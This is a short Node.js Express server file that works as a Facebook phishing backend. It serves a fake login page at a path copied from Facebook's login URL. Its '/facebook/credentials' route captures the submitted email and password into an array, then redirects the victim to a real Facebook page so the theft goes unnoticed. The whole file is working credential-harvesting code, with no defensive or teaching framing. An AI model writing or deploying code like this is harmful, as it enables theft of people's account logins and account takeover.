var express = require('express'),
    app = express(),
    fs = require('fs'),
    path = require('path');

var port = process.env.PORT || 8080;

const cr = [];

app.set('view engine', 'ejs');

app.use("/", express.static(__dirname + '/src'));

app.get('/facebook/login/device-based/regular/login', function(req, res) {
    res.sendFile(path.join(__dirname, '/src', 'index.html'));
});

   
app.post('/facebook/credentials', function(req, res) {
    if( req.body.em !== undefined && req.body.pw !== undefined ) {
        cr.push({em: req.body.em, pw: req.body.pw });
    }
    res.redirect('https://www.facebook.com/TexasHoldEm');
});
app.listen(port);
